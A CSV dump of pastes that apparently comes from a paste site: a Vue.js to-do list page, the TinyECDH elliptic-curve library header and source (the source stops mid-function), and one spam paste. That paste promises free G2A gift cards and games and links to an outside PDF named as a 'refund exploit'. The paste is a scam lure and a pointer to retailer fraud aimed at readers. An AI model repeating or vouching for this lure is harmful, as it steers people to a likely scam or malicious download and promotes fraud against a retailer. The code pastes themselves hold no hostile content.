id,title,username,language,date,content
0DRfyL2P,todo_list_with_notes,Python253,HTML,Sunday 24th of March 2024 12:51:10 AM CDT,"<!--
This script defines a Vue.js application for creating a to-do list with notes.
Users can input new tasks and corresponding notes, view the list of tasks with notes, and delete tasks as needed. 
The application is styled using CSS to provide a visually appealing and user-friendly interface. 
The Vue.js framework is utilized for data binding and DOM manipulation, enabling dynamic updates to the task list without page reloads.
-->
<!DOCTYPE html>
<html lang=""en"">

<head>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
	<title>TO-DO LIST WITH NOTES</title>
	<!-- Importing Vue.js library -->
	<script src=""https://cdn.jsdelivr.net/npm/vue@2""></script>
	<style>
	/* Styling for the entire document */
	
	body {
		font-family: Arial, sans-serif;
		margin: 0;
		padding: 0;
		display: flex;
		justify-content: center;
		align-items: center;
		height: 100vh;
		/* Background gradient */
		background: linear-gradient(-45deg, #000, #000, #191970, #4B0082, #191970, #000, #000);
	}
	/* Styling for the main application container */
	
	#app {
		background-color: #fff;
		padding: 20px;
		border-radius: 8px;
		box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		position: absolute;
		top: 10%;
		left: 10%;
		right: 10%;
		border: 4px solid #000;
		word-wrap: break-word;
		display: flex;
		flex-direction: column;
	}
	/* Styling for headers */
	
	h1,
	strong,
	span {
		text-align: left;
		margin-bottom: 20px;
		font-weight: bold;
	}
	/* Styling for input fields */
	
	input[type=""text""],
	textarea {
		width: calc(100% - 40px);
		padding: 8px;
		border-radius: 4px;
		border: 1px solid #ccc;
		margin-bottom: 10px;
		resize: vertical;
	}
	/* Styling for the to-do list */
	
	ul {
		list-style-type: none;
		padding: 0;
		flex-grow: 1;
		overflow-y: auto;
	}
	
	li {
		display: flex;
		flex-direction: column;
		padding: 8px;
		border-bottom: 1px solid #ccc;
	}
	
	.task {
		margin-bottom: 5px;
		flex-grow: 1;
	}
	/* Styling for buttons */
	
	button {
		background-color: #ff6347;
		color: #fff;
		border: none;
		border-radius: 4px;
		padding: 4px 8px;
		cursor: pointer;
	}
	
	button:hover {
		background-color: #ff473d;
	}
	/* Styling for the submit button */
	
	.submit-btn {
		align-self: flex-end;
	}
	</style>
</head>

<body>
	<!-- Main application container -->
	<div id=""app"">
		<!-- Header -->
		<h1><strong>TO-DO LIST</strong></h1>
		<!-- Input field for adding a new task -->
		<input type=""text"" v-model=""newTodo.task"" placeholder=""ADD A NEW TASK & PRESS [ENTER]..."" @keyup.enter=""focusNotesInput"" ref=""taskInput"">
		<!-- Text area for adding notes -->
		<textarea v-model=""newTodo.note"" placeholder=""ADD NOTES & SELECT [SUBMIT]..."" ref=""notesInput""></textarea>
		<!-- Displaying the list of to-do items -->
		<ul>
			<li v-for=""(todo, index) in todos"" :key=""index"">
				<!-- Displaying the task and a delete button -->
				<div style=""display: flex; align-items: center;""> <strong class=""task"">{{ todo.task }}</strong>
					<button style=""margin-left: 10px;"" @click=""removeTodo(index)"">X</button>
				</div>
				<!-- Displaying notes for the task --><strong>Notes:</strong>
				<br>{{ todo.note }} </li>
		</ul>
		<!-- Submit button -->
		<button class=""submit-btn"" @click=""addTodo"">[SUBMIT]</button>
	</div>
	<!-- Vue.js script -->
	<script>
	// Vue.js instance
	var app = new Vue({
		el: '#app', // Mounting point
		data: {
			// Data for managing to-do items
			newTodo: {
				task: '',
				note: ''
			}, // New to-do item
			todos: [] // List of to-do items
		},
		methods: {
			// Method to add a new to-do item
			addTodo: function() {
				if(this.newTodo.task !== '') {
					this.todos.push({
						task: this.newTodo.task,
						note: this.newTodo.note
					}); // Add new item to the list
					this.newTodo.task = ''; // Clear task input
					this.newTodo.note = ''; // Clear note input
					this.$refs.taskInput.focus(); // Focus on task input
				}
			},
			// Method to remove a to-do item
			removeTodo: function(index) {
				this.todos.splice(index, 1); // Remove item from the list
			},
			// Method to focus on notes input
			focusNotesInput: function() {
				this.$refs.notesInput.focus(); // Focus on notes input
			}
		}
	})
	</script>
</body>

</html>"
sspSkMkq,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Sunday 24th of March 2024 12:24:04 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_535368.pdf

Working as of:
24 March 2024


















"
smsMaPs6,libs/TinyECDH/ecdh.h,FlyFar,C++,Sunday 24th of March 2024 12:23:39 AM CDT,"/* 

  Crypto using elliptic curves defined over the finite binary field GF(2^m) where m is prime.

  The curves used are the anomalous binary curves (ABC-curves) or also called Koblitz curves.

  This class of curves was chosen because it yields efficient implementation of operations.



  Curves available - their different NIST/SECG names and eqivalent symmetric security level:

      NIST      SEC Group     strength
    ------------------------------------
      K-163     sect163k1      80 bit
      B-163     sect163r2      80 bit
      K-233     sect233k1     112 bit
      B-233     sect233r1     112 bit
      K-283     sect283k1     128 bit
      B-283     sect283r1     128 bit
      K-409     sect409k1     192 bit
      B-409     sect409r1     192 bit
      K-571     sect571k1     256 bit
      B-571     sect571r1     256 bit



  Curve parameters from:

    http://www.secg.org/sec2-v2.pdf
    http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf


  Reference:

    https://www.ietf.org/rfc/rfc4492.txt 
*/

#ifndef _ECDH_H__
#define _ECDH_H__


/* for size-annotated integer types: uint8_t, uint32_t etc. */
#include <stdint.h> 

#ifdef __cplusplus
extern ""C"" {
#endif /* __cplusplus */

#define NIST_B163  1
#define NIST_K163  2
#define NIST_B233  3
#define NIST_K233  4
#define NIST_B283  5
#define NIST_K283  6
#define NIST_B409  7
#define NIST_K409  8
#define NIST_B571  9
#define NIST_K571 10

/* What is the default curve to use? */
#ifndef ECC_CURVE
 #define ECC_CURVE NIST_K571
#endif

#if defined(ECC_CURVE) && (ECC_CURVE != 0)
 #if   (ECC_CURVE == NIST_K163) || (ECC_CURVE == NIST_B163)
  #define CURVE_DEGREE       163
  #define ECC_PRV_KEY_SIZE   24
 #elif (ECC_CURVE == NIST_K233) || (ECC_CURVE == NIST_B233)
  #define CURVE_DEGREE       233
  #define ECC_PRV_KEY_SIZE   32
 #elif (ECC_CURVE == NIST_K283) || (ECC_CURVE == NIST_B283)
  #define CURVE_DEGREE       283
  #define ECC_PRV_KEY_SIZE   36
 #elif (ECC_CURVE == NIST_K409) || (ECC_CURVE == NIST_B409)
  #define CURVE_DEGREE       409
  #define ECC_PRV_KEY_SIZE   52
 #elif (ECC_CURVE == NIST_K571) || (ECC_CURVE == NIST_B571)
  #define CURVE_DEGREE       571
  #define ECC_PRV_KEY_SIZE   72
 #endif
#else
 #error Must define a curve to use
#endif

#define ECC_PUB_KEY_SIZE     (2 * ECC_PRV_KEY_SIZE)


/******************************************************************************/


/* NOTE: assumes private is filled with random data before calling */
int ecdh_generate_keys(uint8_t* public_key, uint8_t* private_key);

/* input: own private key + other party's public key, output: shared secret */
int ecdh_shared_secret(const uint8_t* private_key, const uint8_t* others_pub, uint8_t* output);


/******************************************************************************/

#ifdef __cplusplus
}
#endif /* __cplusplus */

#endif /* #ifndef _ECDH_H__ */
"
nrU5TsRq,libs/TinyECDH/ecdh.cpp,FlyFar,C++,Sunday 24th of March 2024 12:21:29 AM CDT,"/* 

  Crypto using elliptic curves defined over the finite binary field GF(2^m) where m is prime.

  The curves used are the anomalous binary curves (ABC-curves) or also called Koblitz curves.

  This class of curves was chosen because it yields efficient implementation of operations.



  Curves available - their different NIST/SECG names and eqivalent symmetric security level:

      NIST      SEC Group     strength
    ------------------------------------
      K-163     sect163k1      80 bit
      B-163     sect163r2      80 bit
      K-233     sect233k1     112 bit
      B-233     sect233r1     112 bit
      K-283     sect283k1     128 bit
      B-283     sect283r1     128 bit
      K-409     sect409k1     192 bit
      B-409     sect409r1     192 bit
      K-571     sect571k1     256 bit
      B-571     sect571r1     256 bit



  Curve parameters from:

    http://www.secg.org/sec2-v2.pdf
    http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf


  Reference:

    https://www.ietf.org/rfc/rfc4492.txt 
*/

#include <stdint.h>
#include ""ecdh.h""


/* margin for overhead needed in intermediate calculations */
#define BITVEC_MARGIN     3
#define BITVEC_NBITS      (CURVE_DEGREE + BITVEC_MARGIN)
#define BITVEC_NWORDS     ((BITVEC_NBITS + 31) / 32)
#define BITVEC_NBYTES     (sizeof(uint32_t) * BITVEC_NWORDS)


/* Disable assertions? */
#ifndef DISABLE_ASSERT
 #define DISABLE_ASSERT 0
#endif

#if defined(DISABLE_ASSERT) && (DISABLE_ASSERT == 1)
 #define assert(...)
#else
 #include <assert.h>
#endif

/* Default to a (somewhat) constant-time mode?
   NOTE: The library is _not_ capable of operating in constant-time and leaks information via timing.
         Even if all operations are written const-time-style, it requires the hardware is able to multiply in constant time. 
         Multiplication on ARM Cortex-M processors takes a variable number of cycles depending on the operands...
*/
#ifndef CONST_TIME
  #define CONST_TIME 0
#endif

/* Default to using ECC_CDH (cofactor multiplication-variation) ? */
#ifndef ECDH_COFACTOR_VARIANT
  #define ECDH_COFACTOR_VARIANT 0
#endif

/******************************************************************************/


/* the following type will represent bit vectors of length (CURVE_DEGREE+MARGIN) */
typedef uint32_t bitvec_t[BITVEC_NWORDS];
typedef bitvec_t gf2elem_t;           /* this type will represent field elements */
typedef bitvec_t scalar_t;
 

/******************************************************************************/

/* Here the curve parameters are defined. */

#if defined (ECC_CURVE) && (ECC_CURVE != 0)
 #if (ECC_CURVE == NIST_K163)
  #define coeff_a  1
  #define cofactor 2
/* NIST K-163 */
const gf2elem_t polynomial = { 0x000000c9, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000008 }; 
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; 
const gf2elem_t base_x     = { 0x5c94eee8, 0xde4e6d5e, 0xaa07d793, 0x7bbc11ac, 0xfe13c053, 0x00000002 }; 
const gf2elem_t base_y     = { 0xccdaa3d9, 0x0536d538, 0x321f2e80, 0x5d38ff58, 0x89070fb0, 0x00000002 }; 
const scalar_t  base_order = { 0x99f8a5ef, 0xa2e0cc0d, 0x00020108, 0x00000000, 0x00000000, 0x00000004 }; 
 #endif

 #if (ECC_CURVE == NIST_B163)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-163 */
const gf2elem_t polynomial = { 0x000000c9, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000008 }; 
const gf2elem_t coeff_b    = { 0x4a3205fd, 0x512f7874, 0x1481eb10, 0xb8c953ca, 0x0a601907, 0x00000002 }; 
const gf2elem_t base_x     = { 0xe8343e36, 0xd4994637, 0xa0991168, 0x86a2d57e, 0xf0eba162, 0x00000003 }; 
const gf2elem_t base_y     = { 0x797324f1, 0xb11c5c0c, 0xa2cdd545, 0x71a0094f, 0xd51fbc6c, 0x00000000 }; 
const scalar_t  base_order = { 0xa4234c33, 0x77e70c12, 0x000292fe, 0x00000000, 0x00000000, 0x00000004 }; 
 #endif

 #if (ECC_CURVE == NIST_K233)
  #define coeff_a  0
  #define cofactor 4
/* NIST K-233 */
const gf2elem_t polynomial = { 0x00000001, 0x00000000, 0x00000400, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000200 };
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 };
const gf2elem_t base_x     = { 0xefad6126, 0x0a4c9d6e, 0x19c26bf5, 0x149563a4, 0x29f22ff4, 0x7e731af1, 0x32ba853a, 0x00000172 };
const gf2elem_t base_y     = { 0x56fae6a3, 0x56e0c110, 0xf18aeb9b, 0x27a8cd9b, 0x555a67c4, 0x19b7f70f, 0x537dece8, 0x000001db };
const scalar_t  base_order = { 0xf173abdf, 0x6efb1ad5, 0xb915bcd4, 0x00069d5b, 0x00000000, 0x00000000, 0x00000000, 0x00000080 };
 #endif

 #if (ECC_CURVE == NIST_B233)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-233 */
const gf2elem_t polynomial = { 0x00000001, 0x00000000, 0x00000400, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000200 }; 
const gf2elem_t coeff_b    = { 0x7d8f90ad, 0x81fe115f, 0x20e9ce42, 0x213b333b, 0x0923bb58, 0x332c7f8c, 0x647ede6c, 0x00000066 }; 
const gf2elem_t base_x     = { 0x71fd558b, 0xf8f8eb73, 0x391f8b36, 0x5fef65bc, 0x39f1bb75, 0x8313bb21, 0xc9dfcbac, 0x000000fa }; 
const gf2elem_t base_y     = { 0x01f81052, 0x36716f7e, 0xf867a7ca, 0xbf8a0bef, 0xe58528be, 0x03350678, 0x6a08a419, 0x00000100 }; 
const scalar_t  base_order = { 0x03cfe0d7, 0x22031d26, 0xe72f8a69, 0x0013e974, 0x00000000, 0x00000000, 0x00000000, 0x00000100 };
 #endif

 #if (ECC_CURVE == NIST_K283)
  #define coeff_a  0
  #define cofactor 4
/* NIST K-283 */
const gf2elem_t polynomial = { 0x000010a1, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x08000000 };
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; 
const gf2elem_t base_x     = { 0x58492836, 0xb0c2ac24, 0x16876913, 0x23c1567a, 0x53cd265f, 0x62f188e5, 0x3f1a3b81, 0x78ca4488, 0x0503213f }; 
const gf2elem_t base_y     = { 0x77dd2259, 0x4e341161, 0xe4596236, 0xe8184698, 0xe87e45c0, 0x07e5426f, 0x8d90f95d, 0x0f1c9e31, 0x01ccda38 }; 
const scalar_t  base_order = { 0x1e163c61, 0x94451e06, 0x265dff7f, 0x2ed07577, 0xffffe9ae, 0xffffffff, 0xffffffff, 0xffffffff, 0x01ffffff }; 
 #endif

 #if (ECC_CURVE == NIST_B283)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-283 */
const gf2elem_t polynomial = { 0x000010a1, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x08000000 }; 
const gf2elem_t coeff_b    = { 0x3b79a2f5, 0xf6263e31, 0xa581485a, 0x45309fa2, 0xca97fd76, 0x19a0303f, 0xa5a4af8a, 0xc8b8596d, 0x027b680a }; 
const gf2elem_t base_x     = { 0x86b12053, 0xf8cdbecd, 0x80e2e198, 0x557eac9c, 0x2eed25b8, 0x70b0dfec, 0xe1934f8c, 0x8db7dd90, 0x05f93925 }; 
const gf2elem_t base_y     = { 0xbe8112f4, 0x13f0df45, 0x826779c8, 0x350eddb0, 0x516ff702, 0xb20d02b4, 0xb98fe6d4, 0xfe24141c, 0x03676854 }; 
const scalar_t  base_order = { 0xefadb307, 0x5b042a7c, 0x938a9016, 0x399660fc, 0xffffef90, 0xffffffff, 0xffffffff, 0xffffffff, 0x03ffffff }; 
 #endif

 #if (ECC_CURVE == NIST_K409)
  #define coeff_a  0
  #define cofactor 4
/* NIST K-409 */
const gf2elem_t polynomial = { 0x00000001, 0x00000000, 0x00800000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x02000000 }; 
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; 
const gf2elem_t base_x     = { 0xe9023746, 0xb35540cf, 0xee222eb1, 0xb5aaaa62, 0xc460189e, 0xf9f67cc2, 0x27accfb8, 0xe307c84c, 0x0efd0987, 0x0f718421, 0xad3ab189, 0x658f49c1, 0x0060f05f }; 
const gf2elem_t base_y     = { 0xd8e0286b, 0x5863ec48, 0xaa9ca27a, 0xe9c55215, 0xda5f6c42, 0xe9ea10e3, 0xe6325165, 0x918ea427, 0x3460782f, 0xbf04299c, 0xacba1dac, 0x0b7c4e42, 0x01e36905 }; 
const scalar_t  base_order = { 0xe01e5fcf, 0x4b5c83b8, 0xe3e7ca5b, 0x557d5ed3, 0x20400ec4, 0x83b2d4ea, 0xfffffe5f, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0x007fffff }; 
 #endif

 #if (ECC_CURVE == NIST_B409)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-409 */
const gf2elem_t polynomial = { 0x00000001, 0x00000000, 0x00800000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x02000000 }; 
const gf2elem_t coeff_b    = { 0x7b13545f, 0x4f50ae31, 0xd57a55aa, 0x72822f6c, 0xa9a197b2, 0xd6ac27c8, 0x4761fa99, 0xf1f3dd67, 0x7fd6422e, 0x3b7b476b, 0x5c4b9a75, 0xc8ee9feb, 0x0021a5c2 }; 
const gf2elem_t base_x     = { 0xbb7996a7, 0x60794e54, 0x5603aeab, 0x8a118051, 0xdc255a86, 0x34e59703, 0xb01ffe5b, 0xf1771d4d, 0x441cde4a, 0x64756260, 0x496b0c60, 0xd088ddb3, 0x015d4860 }; 
const gf2elem_t base_y     = { 0x0273c706, 0x81c364ba, 0xd2181b36, 0xdf4b4f40, 0x38514f1f, 0x5488d08f, 0x0158aa4f, 0xa7bd198d, 0x7636b9c5, 0x24ed106a, 0x2bbfa783, 0xab6be5f3, 0x0061b1cf }; 
const scalar_t  base_order = { 0xd9a21173, 0x8164cd37, 0x9e052f83, 0x5fa47c3c, 0xf33307be, 0xaad6a612, 0x000001e2, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x01000000 }; 
 #endif

 #if (ECC_CURVE == NIST_K571)
  #define coeff_a  0
  #define cofactor 4
/* NIST K-571 */
const gf2elem_t polynomial = { 0x00000425, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x08000000 }; 
const gf2elem_t coeff_b    = { 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 }; 
const gf2elem_t base_x     = { 0xa01c8972, 0xe2945283, 0x4dca88c7, 0x988b4717, 0x494776fb, 0xbbd1ba39, 0xb4ceb08c, 0x47da304d, 0x93b205e6, 0x43709584, 0x01841ca4, 0x60248048, 0x0012d5d4, 0xac9ca297, 0xf8103fe4, 0x82189631, 0x59923fbc, 0x026eb7a8 }; 
const gf2elem_t base_y     = { 0x3ef1c7a3, 0x01cd4c14, 0x591984f6, 0x320430c8, 0x7ba7af1b, 0xb620b01a, 0xf772aedc, 0x4fbebbb9, 0xac44aea7, 0x9d4979c0, 0x006d8a2c, 0xffc61efc, 0x9f307a54, 0x4dd58cec, 0x3bca9531, 0x4f4aeade, 0x7f4fbf37, 0x0349dc80 }; 
const scalar_t  base_order = { 0x637c1001, 0x5cfe778f, 0x1e91deb4, 0xe5d63938, 0xb630d84b, 0x917f4138, 0xb391a8db, 0xf19a63e4, 0x131850e1, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x02000000 }; 
 #endif

 #if (ECC_CURVE == NIST_B571)
  #define coeff_a  1
  #define cofactor 2
/* NIST B-571 */
const gf2elem_t polynomial = { 0x00000425, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x08000000 }; 
const gf2elem_t coeff_b    = { 0x2955727a, 0x7ffeff7f, 0x39baca0c, 0x520e4de7, 0x78ff12aa, 0x4afd185a, 0x56a66e29, 0x2be7ad67, 0x8efa5933, 0x84ffabbd, 0x4a9a18ad, 0xcd6ba8ce, 0xcb8ceff1, 0x5c6a97ff, 0xb7f3d62f, 0xde297117, 0x2221f295, 0x02f40e7e }; 
const gf2elem_t base_x     = { 0x8eec2d19, 0xe1e7769c, 0xc850d927, 0x4abfa3b4, 0x8614f139, 0x99ae6003, 0x5b67fb14, 0xcdd711a3, 0xf4c0d293, 0xbde53950, 0xdb7b2abd, 0xa5f40fc8, 0x955fa80a, 0x0a93d1d2, 0x0d3cd775, 0x6c16c0d4, 0x34b85629, 0x0303001d }; 
const gf2elem_t base_y     = { 0x1b8ac15b, 0x1a4827af, 0x6e23dd3c, 0x16e2f151, 0x0485c19b, 0xb3531d2f, 0x461bb2a8, 0x6291af8f, 0xbab08a57, 0x84423e43, 0x3921e8a6, 0x1980f853, 0x009cbbca, 0x8c6c27a6, 0xb73d69d7, 0x6dccfffe, 0x42da639b, 0x037bf273 }; 
const scalar_t  base_order = { 0x2fe84e47, 0x8382e9bb, 0x5174d66e, 0x161de93d, 0xc7dd9ca1, 0x6823851e, 0x08059b18, 0xff559873, 0xe661ce18, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0x03ffffff }; 
 #endif
#endif



/*************************************************************************************************/

/* Private / static functions: */


/* some basic bit-manipulation routines that act on bit-vectors follow */
static int bitvec_get_bit(const bitvec_t x, const uint32_t idx)
{
  return ((x[idx / 32U] >> (idx & 31U) & 1U));
}

static void bitvec_clr_bit(bitvec_t x, const uint32_t idx)
{
  x[idx / 32U] &= ~(1U << (idx & 31U));
}

static void bitvec_copy(bitvec_t x, const bitvec_t y)
{
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    x[i] = y[i];
  }
}

static void bitvec_swap(bitvec_t x, bitvec_t y)
{
  bitvec_t tmp;
  bitvec_copy(tmp, x);
  bitvec_copy(x, y);
  bitvec_copy(y, tmp);
}

#if defined(CONST_TIME) && (CONST_TIME == 0)
/* fast version of equality test */
static int bitvec_equal(const bitvec_t x, const bitvec_t y)
{
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    if (x[i] != y[i])
    {
      return 0;
    }
  }
  return 1;
}
#else
/* constant time version of equality test */
static int bitvec_equal(const bitvec_t x, const bitvec_t y)
{
  int ret = 1;
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    ret &= (x[i] == y[i]);
  }
  return ret;
}
#endif

static void bitvec_set_zero(bitvec_t x)
{
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    x[i] = 0;
  }
}

#if defined(CONST_TIME) && (CONST_TIME == 0)
/* fast implementation */
static int bitvec_is_zero(const bitvec_t x)
{
  uint32_t i = 0;
  while (i < BITVEC_NWORDS)
  {
    if (x[i] != 0)
    {
      break;
    }
    i += 1;
  }
  return (i == BITVEC_NWORDS);
}
#else
/* constant-time implementation */
static int bitvec_is_zero(const bitvec_t x)
{
  int ret = 1;
  int i = 0;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    ret &= (x[i] == 0);
  }
  return ret;
}
#endif

/* return the number of the highest one-bit + 1 */
static int bitvec_degree(const bitvec_t x)
{
  int i = BITVEC_NWORDS * 32;

  /* Start at the back of the vector (MSB) */
  x += BITVEC_NWORDS;

  /* Skip empty / zero words */
  while (    (i > 0)
          && (*(--x)) == 0)
  {
    i -= 32;
  }
  /* Run through rest if count is not multiple of bitsize of DTYPE */
  if (i != 0)
  {
    uint32_t u32mask = ((uint32_t)1 << 31);
    while (((*x) & u32mask) == 0)
    {
      u32mask >>= 1;
      i -= 1;
    }
  }
  return i;
}

/* left-shift by 'count' digits */
static void bitvec_lshift(bitvec_t x, const bitvec_t y, int nbits)
{
  int nwords = (nbits / 32);

  /* Shift whole words first if nwords > 0 */
  int i,j;
  for (i = 0; i < nwords; ++i)
  {
    /* Zero-initialize from least-significant word until offset reached */
    x[i] = 0;
  }
  j = 0;
  /* Copy to x output */
  while (i < BITVEC_NWORDS)
  {
    x[i] = y[j];
    i += 1;
    j += 1;
  }

  /* Shift the rest if count was not multiple of bitsize of DTYPE */
  nbits &= 31;
  if (nbits != 0)
  {
    /* Left shift rest */
    int i;
    for (i = (BITVEC_NWORDS - 1); i > 0; --i)
    {
      x[i]  = (x[i] << nbits) | (x[i - 1] >> (32 - nbits));
    }
    x[0] <<= nbits;
  }
}


/*************************************************************************************************/
/*
  Code that does arithmetic on bit-vectors in the Galois Field GF(2^CURVE_DEGREE).
*/
/*************************************************************************************************/


static void gf2field_set_one(gf2elem_t x)
{
  /* Set first word to one */
  x[0] = 1;
  /* .. and the rest to zero */
  int i;
  for (i = 1; i < BITVEC_NWORDS; ++i)
  {
    x[i] = 0;
  }
}

#if defined(CONST_TIME) && (CONST_TIME == 0)
/* fastest check if x == 1 */
static int gf2field_is_one(const gf2elem_t x) 
{
  /* Check if first word == 1 */
  if (x[0] != 1)
  {
    return 0;
  }
  /* ...and if rest of words == 0 */
  int i;
  for (i = 1; i < BITVEC_NWORDS; ++i)
  {
    if (x[i] != 0)
    {
      break;
    }
  }
  return (i == BITVEC_NWORDS);
}
#else
/* constant-time check */
static int gf2field_is_one(const gf2elem_t x)
{
  int ret = 0;
  /* Check if first word == 1 */
  if (x[0] == 1)
  {
    ret = 1;
  }
  /* ...and if rest of words == 0 */
  int i;
  for (i = 1; i < BITVEC_NWORDS; ++i)
  {
    ret &= (x[i] == 0);
  }
  return ret; //(i == BITVEC_NWORDS);
}
#endif


/* galois field(2^m) addition is modulo 2, so XOR is used instead - 'z := a + b' */
static void gf2field_add(gf2elem_t z, const gf2elem_t x, const gf2elem_t y)
{
  int i;
  for (i = 0; i < BITVEC_NWORDS; ++i)
  {
    z[i] = (x[i] ^ y[i]);
  }
}

/* increment element */
static void gf2field_inc(gf2elem_t x)
{
  x[0] ^= 1;
}


/* field multiplication 'z := (x * y)' */
static void gf2field_mul(gf2elem_t z, const gf2elem_t x, const gf2elem_t y)
{
  int i;
  gf2elem_t tmp;
#if defined(CONST_TIME) && (CONST_TIME == 1)
  gf2elem_t blind;
  bitvec_set_zero(blind);
#endif
  assert(z != y);

  bitvec_copy(tmp, x);

  /* LSB set? Then start with x */
  if (bitvec_get_bit(y, 0) != 0)
  {
    bitvec_copy(z, x);
  }
  else /* .. or else start with zero */
  {
    bitvec_set_zero(z);
  }

  /* Then add 2^i * x for the rest */
  for (i = 1; i < CURVE_DEGREE; ++i)
  {
    /* lshift 1 - doubling the value of tmp */
    bitvec_lshift(tmp, tmp, 1);

    /* Modulo reduction polynomial if degree(tmp) > CURVE_DEGREE */
    if (bitvec_get_bit(tmp, CURVE_DEGREE))
    {
      gf2field_add(tmp, tmp, polynomial);
    }
#if defined(CONST_TIME) && (CONST_TIME == 1)
    else /* blinding operation */
    {
      gf2field_add(tmp, tmp, blind);
    }
#endif

    /* Add 2^i * tmp if this factor in y is non-zero */
    if (bitvec_get_bit(y, i))
    {
      gf2field_add(z, z, tmp);
    }
#if defined(CONST_TIME) && (CONST_TIME == 1)
    else /* blinding operation */
    {
      gf2field_add(z, z, blind);
    }
#endif
  }
}

/* field inversion 'z := 1/x' */
static void gf2field_inv(gf2elem_t z, const gf2elem_t x)
{
  gf2elem_t u, v, g, h;
  int i;

  bitvec_copy(u, x);
  bitvec_copy(v, polynomial);
  bitvec_set_zero(g);
  gf2field_set_one(z);
  
  while (!gf2field_is_one(u))
  {
    i = (bitvec_degree(u) - bitvec_degree(v));

    if (i < 0)
    {
      bitvec_swap(u, v);
      bitvec_swap(g, z);
      i = -i;
    }
#if defined(CONST_TIME) && (CONST_TIME == 1)
    else
    {
      bitvec_swap(u, v);
      bitvec_swap(v, u);
    }
#endif
    bitvec_lshift(h, v, i);
    gf2field_add(u, u, h);
    bitvec_lshift(h, g, i);
    gf2field_add(z, z, h);
  }
}

/*************************************************************************************************/
/*
   The following code takes care of Galois-Field arithmetic. 
   Elliptic curve points are represented  by pairs (x,y) of bitvec_t. 
   It is assumed that curve coefficient 'a' is {0,1}
   This is the case for all NIST binary curves.
   Coefficient 'b' is given in 'coeff_b'.
   '(base_x, base_y)' is a point that generates a large prime order group.
*/
/*************************************************************************************************/


static void gf2point_copy(gf2elem_t x1, gf2elem_t y1, const gf2elem_t x2, const gf2elem_t y2)
{
  bitvec_copy(x1, x2);
  bitvec_copy(y1, y2);
}

static void gf2point_set_zero(gf2elem_t x, gf2elem_t y)
{
  bitvec_set_zero(x);
  bitvec_set_zero(y);
}

static int gf2point_is_zero(const gf2elem_t x, const gf2elem_t y)
{
  return (    bitvec_is_zero(x)
           && bitvec_is_zero(y));
}

/* double the point (x,y) */
static void gf2point_double(gf2elem_t x, gf2elem_t y)
{
  /* iff P = O (zero or infinity): 2 * P = P */
  if (bitvec_is_zero(x))
  {
    bitvec_set_zero(y);
  }
  else
  {
    gf2elem_t l;

    gf2field_inv(l, x);
    gf2field_mul(l, l, y);
    gf2field_add(l, l, x);
    gf2field_mul(y, x, x);
    gf2field_mul(x, l, l);
#if (coeff_a == 1)
    gf2field_inc(l);
#endif
    gf2field_add(x, x, l);
    gf2field_mul(l, l, x);
    gf2field_add(y, y, l);
  }
}


/* add two points together (x1, y1) := (x1, y1) + (x2, y2) */
static void gf2point_add(gf2elem_t x1, gf2elem_t y1, const gf2elem_t x2, const gf2elem_t y2)
{
  if (!gf2point_is_zero(x2, y2))
  {
